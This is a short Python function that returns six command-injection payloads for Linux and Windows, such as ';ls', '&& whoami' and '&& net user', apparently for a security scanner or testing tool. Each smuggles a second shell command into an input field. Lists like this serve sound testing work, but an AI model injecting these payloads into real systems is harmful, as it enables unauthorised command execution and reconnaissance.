def get_command_injection_payloads():
    return [
        {"os": "Linux", "payload": ";ls"},
        {"os": "Linux", "payload": "&& whoami"},
        {"os": "Linux", "payload": "| id"},
        {"os": "Windows", "payload": "& dir"},
        {"os": "Windows", "payload": "| whoami"},
        {"os": "Windows", "payload": "&& net user"}
    ]
